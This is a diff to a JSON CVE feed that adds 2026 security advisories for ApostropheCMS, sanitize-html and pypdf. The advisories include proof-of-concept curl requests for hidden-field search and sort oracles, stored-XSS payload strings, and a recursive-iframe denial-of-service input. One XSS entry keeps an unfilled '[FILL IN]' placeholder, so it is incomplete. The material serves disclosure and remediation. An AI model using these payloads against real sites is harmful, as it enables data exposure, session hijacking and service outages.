@@ -12,244 +12,432 @@
   },
   "cves": [
     {
-      "id": "CVE-2001-0162",
-      "summary": "WinCE 3.0.9348 generates predictable TCP Initial Sequence Numbers (ISNs), which allows remote attackers to spoof or hijack TCP connections.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-01-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf",
-        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0163",
-      "summary": "Cisco AP340 base station produces predictable TCP Initial Sequence Numbers (ISNs), which allows remote attackers to spoof or hijack TCP connections.",
-      "cvssScore": 4.6,
+      "id": "CVE-2026-112954",
+      "summary": "### Summary\nApostropheCMS lets a module expose an anonymous read API by setting `publicApiProjection`, which whitelists the document fields unauthenticated callers may see. The public REST GET handler applies every launderable query builder from the query string *before* forcing that projection. Two of those builders, `search` and `sort`, operate on the underlying documents rather than the projected output, and neither is checked against the projection. An unauthenticated attacker can therefore:\n\n- use `?search=<word>` as a **value oracle** to confirm and locate documents by the content of a field the projection was meant to hide, and\n- use `?sort[hiddenField]=1` as an **ordering oracle** to rank documents by a hidden field's value.\n\nThis is the same confidentiality-bypass class already patched for the `choices`/`counts` builders (gated by `choicesFieldAllowedByProjection`). That gate was never applied to `search` or `sort`.\n\n### Details\nFor an anonymous caller, `getRestQuery` (piece types: `modules/@apostrophecms/piece-type/index.js:1142`; pages: `modules/@apostrophecms/page/index.js`) does:\n\n```js\nconst query = self.find(req).attachments(true);\nquery.applyBuildersSafely(req.query);            // (1) apply ALL launderable builders from the query string\n...\nquery.project({ ...self.options.publicApiProjection, cacheInvalidatedAt: 1 }); // (2) force read projection\nquery.set('publicApiProjection', self.options.publicApiProjection);            // (3) used only by the choices/counts gate\n```\n\n`applyBuildersSafely` (`modules/@apostrophecms/doc-type/index.js:3327`) runs any builder that has a `launder` method. `search` and `sort` both have one (`doc-type/index.js:2288` and `2127`), so `?search=` and `?sort[...]=` are honored for anonymous requests.\n\n**Search vector.** The `search` builder adds `{ $text: { $search: <user input> } }` (`doc-type/index.js:2282`). The `$text` index covers `highSearchText` / `lowSearchText` / `title` / `searchBoost` (`modules/@apostrophecms/doc/index.js:612`). `highSearchText` / `lowSearchText` are built at save time by `@apostrophecms/search:getSearchTexts` → `apos.schema.indexFields(schema, doc, texts)` (`modules/@apostrophecms/search/index.js:377`), which indexes every schema field where `searchable !== false` (the default for string/text fields). `publicApiProjection` does not imply `searchable: false`. Step (2) narrows the output but not the `$text` filter, so the response returns the projected `{title, slug, _id}` of exactly the documents whose hidden field contains the searched word.\n\n**Sort vector.** `finalizeSort` (`doc-type/index.js:3526`) forwards raw user sort keys to MongoDB (it only rewrites fields flagged `sortify: true`). `?sort[hiddenField]=1` orders results by a projection-excluded field. Combined with `perPage`/`page`, an attacker can page through the fully ordered set.\n\nNeither builder consults `publicApiProjection`, whereas `choices`/`counts` are gated at `doc-type/index.js:2807` via `choicesFieldAllowedByProjection`.\n\n### PoC\n**Preconditions:** the piece/page type sets `publicApiProjection`, and its schema has at least one searchable (default) or sortable field not included in the projection.\n\nTest type: `article` exposes only `title`, `slug`, `_id`, but has hidden `secret` (integer) and `secretNote` (searchable string):\n\n```js\nexport default {\n  extend: '@apostrophecms/piece-type',\n  options: { publicApiProjection: { title: 1, slug: 1, _id: 1 } },\n  fields: { add: {\n    secret:     { type: 'integer' },\n    secretNote: { type: 'string' }   // searchable by default; NOT in the projection\n  } }\n};\n```\n\nFive articles were inserted and published via the authenticated REST API:\n`A.secret=50, secretNote=\"zzsecretalpha\"`; `B=10/zzsecretbravo`; `C=90/zzsecretcharlie`; `D=30/zzsecretdelta`; `E=70/zzsecretecho`.\nThe insert responses confirm the hidden `secretNote` value is written into the search index, e.g. for A: `\"highSearchText\": \"... zzsecretalpha\"`, `\"lowSearchText\": \"... zzsecretalpha\"`.\n\nAnonymous requests (no credentials, no session):\n\n```bash\n# [1] Baseline: projection hides secret/secretNote on direct read\ncurl -s 'http://localhost:3000/api/v1/article?perPage=1'\n\n# [2] Search oracle: value exists ONLY in hidden secretNote\ncurl -s 'http://localhost:3000/api/v1/article?search=zzsecretalpha'\ncurl -s 'http://localhost:3000/api/v1/article?search=zznotpresentxyz'\n\n# [3] Sort oracle: order by hidden integer field\ncurl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=1'\ncurl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=-1'\n\n# Negative control: projection override is blocked\ncurl -s 'http://localhost:3000/api/v1/article?project%5BsecretNote%5D=1&perPage=1'\n```\n\nResults (verified on ApostropheCMS 4.32.2, MongoDB 7.0):\n\n| Request (anonymous)       | Observed                                          | Verdict                               |\n| ------------------------- | ------------------------------------------------- | ------------------------------------- |\n| `GET /api/v1/article`     | `_id,title,slug,type,metaType,cacheInvalidatedAt` | projection works on direct read       |\n| `?search=zzsecretalpha`   | only Article A (with textScore)                   | **leak**: locates doc by hidden field |\n| `?search=zznotpresentxyz` | 0 results                                         | oracle confirmed                      |\n| `?sort[secret]=1`         | B, D, A, E, C  (= 10,30,50,70,90)                 | **leak**: full hidden ordering        |\n| `?sort[secret]=-1`        | C, E, A, D, B                                     | reverse confirmed                     |\n| `?project[secretNote]=1`  | secretNote absent                                 | gated (projection override blocked)   |\n\n### Impact\nUnauthenticated, network-reachable partial disclosure of fields the developer explicitly restricted with `publicApiProjection`:\n\n- **Search oracle:** confirm and locate documents by words in hidden fields (e.g. internal notes, contact emails, draft metadata, moderation/status flags), returning the `title`/`slug`/`_id` of matches.\n- **Sort oracle:** full ordering of documents by a hidden field. With one known reference value or a paging binary search, exact hidden values can be recovered.\n\nNo authentication or user interaction required. Not a full field dump, but a targeted oracle over exactly the data the projection is meant to conceal. Affects sites that configure `publicApiProjection` on piece types or pages, up to and including 4.32.2 (same code path present on current `main`).\n\n### Remediation\nGate `search`, `sort` (and `autocomplete`, which feeds `search`) on the public API path the same way `choices`/`counts` are gated. When `publicApiProjection` is in force:\n\n- **sort:** reject or drop any sort key not permitted by the projection, reusing `choicesFieldAllowedByProjection`.\n- **search:** restrict full-text search to fields the projection exposes (e.g. a projection-scoped search text), or refuse the `search` builder when the projection excludes any searchable field.",
+      "cvssScore": 5.3,
       "severity": "Medium",
-      "published": "2001-01-01",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      },
       "references": [
-        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf",
-        "http://www.cs.jhu.edu/~seny/pubs/wince802.pdf"
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-rqgm-cfrp-4hx8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112954",
+        "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+        "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+        "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "apostrophe npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0175",
-      "summary": "SGI IRIX before 6.5.21 allows local users to cause a denial of service (kernel panic) via a certain call to the PIOCSWATCH ioctl.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://patches.sgi.com/support/free/security/advisories/20030603-01-P",
-        "http://www.kb.cert.org/vuls/id/142228",
-        "http://www.securityfocus.com/bid/7868",
-        "http://www.securitytracker.com/id?1008770",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12241"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0368",
-      "summary": "Nokia Gateway GPRS support node (GGSN) allows remote attackers to cause a denial of service (kernel panic) via a malformed IP packet with a 0xFF TCP option.",
-      "cvssScore": 5,
+      "id": "CVE-2026-112951",
+      "summary": "### Summary\nThe color field accepts any string that *begins* with a valid `rgb()` / `hsl()` color, because `TinyColor.isValid` does not anchor its match at the end of the string. An authenticated user with edit rights can store arbitrary HTML after a valid color prefix. When the stored value is rendered , the payload executes, resulting in stored XSS.\n\n### Details\nServer-side validation of the color field relies on TinyColor:\n\n```js\nconst { TinyColor } = require('@ctrl/tinycolor');\nif (!new TinyColor(value).isValid) throw self.apos.error('invalid');\n```\n\nTinyColor's `rgb`/`hsl` matchers are not anchored at the end of the string, while hex matchers are. Tested with @ctrl/tinycolor\n\n| Input | `isValid` |\n|---|---|\n| `rgb(1,2,3)<img src=x onerror=alert(1)>` | `true` |\n| `rgb(1,2,3)</textarea><script>alert(1)</script>` | `true` |\n| `hsl(0,100%,50%);--x:1}</style><script>alert(1)</script>` | `true` |\n| `#ff0000<img src=x onerror=alert(1)>` | `false` |\n\nThe value is saved to MongoDB unchanged (not normalized to hex8).\n\n### Relation to GHSA-97v6-998m-fp4g\nGHSA-97v6 addressed CSS custom property injection escaping a `<style>` context. The root cause (validation that accepts trailing content after a valid color) still exists in <= 4.32.2, so [FILL IN: either \"the style-tag sink remains exploitable via `</style>`\" OR \"a separate HTML sink at X is exploitable\"]. Fixing the validation (requiring the full string to be a color, or storing only TinyColor's normalized output) would close both.\n\n### Impact\nAny user with edit permission can plant persistent JavaScript that runs in the browser of visitors and administrators viewing the affected page, enabling session hijacking and actions as an admin.\n\n### Suggested fix\nReject values unless the entire string is a valid color, e.g. normalize on save:\n```js\nconst c = new TinyColor(value);\nif (!c.isValid) throw self.apos.error('invalid');\nvalue = c.toHex8String(); // store only normalized output\n```",
+      "cvssScore": 5.4,
       "severity": "Medium",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": "CWE-20",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-79",
+        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+      },
       "references": [
-        "http://www.atstake.com/research/advisories/2003/a060903-1.txt",
-        "http://www.kb.cert.org/vuls/id/924812",
-        "http://www.securityfocus.com/bid/7854",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12221",
-        "http://www.atstake.com/research/advisories/2003/a060903-1.txt"
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vmgj-9cwm-cf3h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112951",
+        "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+        "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+        "https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.34.0"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "apostrophe npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0814",
-      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to bypass zone restrictions and execute Javascript by setting the window's \"href\" to the malicious Javascript, then calling execCommand(\"Refresh\") to refresh the page, aka BodyRefreshLoadsJPU or the \"ExecCommand Cross Domain\" vulnerability.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
+      "id": "CVE-2026-113650",
+      "summary": "### Summary\n\nSince 2.18.0, when an `<iframe>` is not allowed and `disallowedTagsMode` is `'discard'` (the defaults),\nits raw-text content is re-sanitized by a recursive call to `sanitizeHtml(text, options)` (the change\nfrom #5564, fixing #5550). The recursion has no bound and starts each nested call with a fresh state.\nTwo consequences, both absent from 2.17.7 and 2.17.4:\n\n1. A few kilobytes of unclosed `<iframe>` tags throw `RangeError: Maximum call stack size exceeded`\n   with the default options. Any application that sanitizes untrusted HTML with 2.18.0 can be made to\n   throw on a small crafted input.\n2. `nestingLimit` is not enforced across a discarded iframe: each nested iframe restarts the depth\n   count at zero, so the output can be nested arbitrarily deep regardless of the configured limit.\n\n### Affected versions\n\n- 2.18.0 (the current `latest`), and the `main` branch at the time of writing (the recursive call is\n  still in `packages/sanitize-html/index.js`, in the `ontext` handler, branch\n  `tag === 'iframe' && !tagAllowed(tag) && options.disallowedTagsMode === 'discard'`).\n- Not affected: 2.17.7 and 2.17.4 (tested with the same inputs below).\n\nTested with Node.js v26.7.0.\n\n### Reproduction 1: stack overflow with the default options\n\n```js\nconst sanitizeHtml = require('sanitize-html');\n\n// with 2.18.0:\nsanitizeHtml('<iframe>'.repeat(1000));  // 8,000 chars: returns ''\nsanitizeHtml('<iframe>'.repeat(2000));  // 16,000 chars: throws RangeError: Maximum call stack size exceeded\nsanitizeHtml('<iframe>'.repeat(20000)); // 160,000 chars: throws RangeError: Maximum call stack size exceeded\n```\n\nResults:\n\n| input | 2.17.4 | 2.17.7 | 2.18.0 |\n|---|---|---|---|\n| `'<iframe>'.repeat(1000)` | ok | ok | ok |\n| `'<iframe>'.repeat(2000)` | ok | ok | RangeError |\n| `'<iframe>'.repeat(20000)` | ok | ok | RangeError |\n\nThe threshold depends on the remaining stack, so it is lower when `sanitizeHtml` is called from an\nalready deep call stack (for example inside a server-side rendering pass).\n\n### Reproduction 2: `nestingLimit` is bypassed\n\n```js\nconst sanitizeHtml = require('sanitize-html');\n\nconst input = ('<iframe>' + '<b>'.repeat(3)).repeat(50) + 'x';\nconst out = sanitizeHtml(input, { allowedTags: ['b'], nestingLimit: 3 });\n// maximum nesting depth of <b> in `out`:\n//   2.17.4: 2    2.17.7: 0 (fallback escaped as text)    2.18.0: 150\n```\n\nWithout an iframe, the same options cap the output at three nested `<b>` in all three versions. With\n`k` repetitions of `'<iframe>' + '<b>'.repeat(3)`, 2.18.0 returns `3 * k` nested `<b>` (measured for\nk = 1, 5, 50: depth 3, 15, 150).\n\n### Cause\n\nIn 2.18.0 the `ontext` handler does:\n\n```js\n} else if (\n  tag === 'iframe' &&\n  !tagAllowed(tag) &&\n  options.disallowedTagsMode === 'discard'\n) {\n  result += sanitizeHtml(text, options);\n}\n```\n\nBecause htmlparser2 treats `<iframe>` as a raw-text element, the text of an unclosed iframe is the whole\nremainder of the input; re-parsing it can meet another unclosed `<iframe>`, and so on, one stack frame\n(and one full re-parse) per iframe. The nested call also starts with its own `depth`, so tags inside the\nfallback are not counted against `nestingLimit` together with the enclosing tags.\n\n### Possible directions\n\nNot a patch, only what would close both effects: bound the recursion (or process the fallback without\nrecursing), and carry the current depth into the nested sanitization so that `nestingLimit` applies to\nthe whole output.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-674",
+        "name": "Uncontrolled Recursion"
+      },
       "references": [
-        "http://secunia.com/advisories/10192",
-        "http://securitytracker.com/id?1007687",
-        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2003-09/0177.html",
-        "http://www.kb.cert.org/vuls/id/326412",
-        "http://www.safecenter.net/liudieyu/BodyRefreshLoadsJPU/BodyRefreshLoadsJPU-Content.htm"
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-c9rx-x947-fp3h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-113650",
+        "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+        "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+        "https://github.com/apostrophecms/apostrophe/releases/tag/sanitize-html@2.18.1"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "sanitize-html npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0815",
-      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to bypass zone restrictions and read arbitrary files by (1) modifying the createTextRange method and using CreateLink, as demonstrated using LinkillerSaveRef, LinkillerJPU, and Linkiller, or (2) modifying the createRange method and using the FIND dialog to select text, as demonstrated using Findeath, aka the \"Function Pointer Override Cross Domain\" vulnerability.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
+      "id": "CVE-2026-113649",
+      "summary": "## Review scope and evidence limits\n\nPackage: @apostrophecms/import-export, version 3.7.0.\n\nRelease tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).\n\nCurrent main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.\n\nThe importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. \n\n## Import API bypasses publication roles for protected content\n\nThe import gate in canImportOrExport() checks the type's import configuration and view permission. The write helpers then call document-manager insert/update directly, including operations on published variants. We did not find the normal publish permission check or beforePublish transition in these helpers. Core permissions intentionally distinguish editRole and publishRole, and the ordinary publication lifecycle enforces that distinction.\n\nThe reported security boundary is a content type that an editor may edit but whose publication is reserved for a stronger role. Direct public-state changes through import must enforce the same publication authority. The original report describes unauthorized creation, replacement, or removal of published content under that configuration.\n\nSuggested remediation: centralize authorization for import writes; require publish permission for every non-autopublished published variant, authorize each concrete target, and preflight the complete import before persistent changes. Preserve authorized draft imports and the intended behavior of autopublished types.\n\nSource references:\n- [Import write helpers](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)\n- [Import permission gate](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/index.js)\n- [Core role distinctions](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/permission/index.js)\n- [Core insert/update/publication permission hooks](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/doc/index.js)\n\n## Coordination\n\nVivek R / Winfunc\nOriginal reporting team: Mufeed VH / Winfunc",
+      "cvssScore": 6.5,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      },
       "references": [
-        "http://marc.info/?l=bugtraq&m=106321757619047&w=2",
-        "http://marc.info/?l=bugtraq&m=106322542104656&w=2",
-        "http://secunia.com/advisories/10192",
-        "http://securitytracker.com/id?1007687",
-        "http://www.ciac.org/ciac/bulletins/o-021.shtml"
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-5m22-7pfq-vp65",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-113649",
+        "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+        "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+        "https://github.com/apostrophecms/apostrophe/releases/tag/%40apostrophecms/import-export%403.7.1"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@apostrophecms/import-export npm",
+        "apostrophe npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0816",
-      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to bypass zone restrictions by (1) using the NavigateAndFind method to load a file: URL containing Javascript, as demonstrated by NAFfileJPU, (2) using the window.open method to load a file: URL containing Javascript, as demonstrated using WsOpenFileJPU, (3) setting the href property in the base tag for the _search window, as demonstrated using WsBASEjpu, (4) loading the search window into an Iframe, as demonstrated using WsFakeSrc, (5) caching a javascript: URL in the browser history, then accessing that URL in the same frame as the target domain, as demonstrated using WsOpenJpuInHistory, NAFjpuInHistory, BackMyParent, BackMyParent2, and RefBack, aka the \"Script URLs Cross Domain\" vulnerability.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
+      "id": "CVE-2026-112956",
+      "summary": "## Review scope and evidence limits\n\nPackage: @apostrophecms/import-export, version 3.7.0.\n\nRelease tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).\n\nCurrent main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.\n\nThe importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.\n\n## Archive duplicate continuation permits unauthorized published-content replacement\n\nThe overrideDuplicates() continuation still accepts client-supplied replacement choices, rather than binding them to a server-maintained, user-owned duplicate analysis. The replacement and write helpers do not establish a single canonical resource identity and authorization context before the update. This leaves the reported gap between draft editing authority and the published target selected for replacement unresolved at source level.\n\nThe original report describes a contributor crossing the publication boundary through duplicate replacement on an import-enabled localized type. We have not repeated that end-to-end sequence on 3.7.0.\n\nSuggested remediation: bind continuation state to the initiating user, archive, job, permitted source/target mapping, locale and mode; reject inconsistent identity metadata; derive permissions from the actual loaded target and require publication authority for published targets.\n\nSource: overrideDuplicates(), replaceDocId(), and insertOrUpdateDoc() in the [importer](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js).\n\n## Coordination\n\nVivek R / Winfunc\nOriginal reporting team: Mufeed VH / Winfunc",
+      "cvssScore": 6.5,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-863",
+        "name": "Incorrect Authorization"
+      },
       "references": [
-        "http://marc.info/?l=bugtraq&m=106321638416884&w=2",
-        "http://marc.info/?l=bugtraq&m=106321693517858&w=2",
-        "http://marc.info/?l=bugtraq&m=106321781819727&w=2",
-        "http://marc.info/?l=bugtraq&m=106321882821788&w=2",
-        "http://marc.info/?l=bugtraq&m=106322063729496&w=2"
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-jf5h-36mg-rp6x",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112956",
+        "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+        "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+        "https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.1"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@apostrophecms/import-export npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0817",
-      "summary": "Internet Explorer 5.01 through 6 SP1 allows remote attackers to bypass zone restrictions and read arbitrary files via an XML object.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
+      "id": "CVE-2026-112955",
+      "summary": "## Review scope and evidence limits\n\nPackage: @apostrophecms/import-export, version 3.7.0.\n\nRelease tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).\n\nCurrent main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.\n\nThe importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.\n\n## Import archive extraction lacks resource quotas and failure cleanup\n\nThe current gzip extractor handles destination write errors and waits for write completion; those parts of the original report should no longer be treated as unchanged. The import routes also now require a logged-in user before big-upload processing, as covered by GHSA-86wm-68pq-5jwq.\n\nHowever, extract() still writes expanded archive entries without per-entry, aggregate decompressed-byte, or entry-count quotas. Archive parsing still precedes document-type authorization. If extraction or parsing fails, import() notifies and rethrows before the later storage.remove() call, with no unconditional cleanup around that lifecycle. The reported residual risk is excessive storage consumption and retained extraction/staging artifacts from authenticated imports. Handling a write error and requiring login do not enforce a storage budget.\n\nSuggested remediation: add configurable streaming quotas based on actual decompressed bytes, cap entries and allowed entry types, bound concurrent imports, and clean local and uploadfs artifacts on every failure. Retain continuation artifacts only under explicit ownership, expiry and total-storage limits.\n\nSource references:\n- [Gzip extractor](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/formats/gzip.js)\n- [Import lifecycle and cleanup](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)\n- [Related authentication fix](https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-86wm-68pq-5jwq)\n\n## Coordination\n\nVivek R / Winfunc\nOriginal reporting team: Mufeed VH / Winfunc",
+      "cvssScore": 6.5,
+      "severity": "Medium",
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
       "references": [
-        "http://secunia.com/advisories/10192",
-        "http://www.securityfocus.com/bid/9012",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-048",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A508",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A520"
+        "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9g7p-m758-rp72",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112955",
+        "https://github.com/apostrophecms/apostrophe/commit/06e4b377f3c360f9e89c32dccd7e505ad5ddf498",
+        "https://github.com/apostrophecms/apostrophe/commit/40b989b1a9dd23d30029b8ce7668634265cfe5ea",
+        "https://github.com/apostrophecms/apostrophe/releases/tag/@apostrophecms/import-export@3.7.1"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@apostrophecms/import-export npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0823",
-      "summary": "Internet Explorer 6 SP1 and earlier allows remote attackers to direct drag and drop behaviors and other mouse click actions to other windows by calling the window.moveBy method, aka HijackClick, a different vulnerability than CVE-2003-1027.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=106322197932006&w=2",
-        "http://secunia.com/advisories/10192",
-        "http://www.kb.cert.org/vuls/id/413886",
-        "http://www.securityfocus.com/archive/1/337086",
-        "http://www.securitytracker.com/id?1006036"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0902",
-      "summary": "Unknown vulnerability in minimalist mailing list manager 2.4, 2.2, and possibly other versions, allows remote attackers to execute arbitrary commands.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.debian.org/security/2003/dsa-402",
-        "http://www.debian.org/security/2003/dsa-402"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-96339",
-      "summary": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Houzez.co Houzez houzez allows Reflected XSS.This issue affects Houzez: from n/a through 4.4.0.",
+      "id": "CVE-2026-113792",
+      "summary": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires calling `find_outline_item` on a `PdfWriter`.\n\n### Patches\n\nThis has been fixed in [pypdf==6.20.1](https://github.com/py-pdf/pypdf/releases/tag/6.20.1).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#4188](https://github.com/py-pdf/pypdf/pull/4188).",
       "cvssScore": 6,
       "severity": "Medium",
-      "published": "2026-10-16",
-      "modified": "2026-10-16",
-      "cwe": null,
+      "published": "2026-10-21",
+      "modified": "2026-10-21",
+      "cwe": {
+        "cwe_id": "CWE-835",
+        "name": "Loop with Unreachable Exit Condition ('Infinite Loop')"
+      },
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-96339",
-        "https://patchstack.com/database/wordpress/theme/houzez/vulnerability/wordpress-houzez-theme-4-4-0-cross-site-scripting-xss-vulnerability?_s_id=cve"
+        "https://github.com/py-pdf/pypdf/security/advisories/GHSA-qfv9-64jg-mh7p",
+        "https://github.com/py-pdf/pypdf/pull/4188",
+        "https://github.com/py-pdf/pypdf/commit/c9c35b4471c2eb5fe078094f6c816e69d4ed25a0",
+        "https://github.com/py-pdf/pypdf/releases/tag/6.20.1",
+        "https://github.com/advisories/GHSA-qfv9-64jg-mh7p"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "pypdf pip"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-94388",
-      "summary": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in halfdata Green Popups halfdata-green-popups allows Blind SQL Injection.This issue affects Green Popups: from n/a before 7.6.3.",
-      "cvssScore": 7.1,
+      "id": "CVE-2026-113793",
